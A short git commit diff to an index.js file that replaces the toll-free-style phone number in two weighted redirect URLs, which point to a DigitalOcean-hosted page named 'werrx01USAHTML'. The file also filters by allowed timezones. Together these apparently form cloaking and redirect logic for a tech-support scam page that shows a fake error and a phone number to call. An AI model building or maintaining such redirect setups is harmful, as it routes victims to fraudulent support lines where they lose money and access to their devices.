18059d67a0e7e7cf853caa86ff3c5461efa91410
paalakash <palaksh452@gmail.com>
2026-06-03 10:00:18 +0530

    Modify RAW_CONFIGS with new URL entries
    Updated RAW_CONFIGS with new URLs and weights.

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://lionfish-app-hify4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 },
-    { url: "https://lionfish-app-hify4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 }
+    { url: "https://lionfish-app-hify4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-900-934", weight: 0.5 },
+    { url: "https://lionfish-app-hify4.ondigitalocean.app/werrx01USAHTML/?bcda=1800-900-934", weight: 0.5 }
 
 ];
 
